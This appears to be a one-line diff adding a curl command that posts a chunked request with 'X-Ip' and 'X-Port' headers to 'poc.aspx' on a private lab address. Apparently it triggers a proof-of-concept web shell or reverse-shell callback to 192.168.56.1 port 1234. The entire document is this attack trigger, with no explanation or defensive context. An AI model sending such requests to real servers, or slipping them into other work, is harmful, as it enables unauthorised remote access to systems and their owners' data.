@@ -1,0 +1,1 @@
+curl -X POST --header "Transfer-Encoding: chunked" --header "X-Init: 1" -H "X-Ip: 192.168.56.1" -H "X-Port: 1234" -H "Connection: close" -v --data-binary "" -s -c cookies "http://192.168.56.101:80/poc.aspx" 
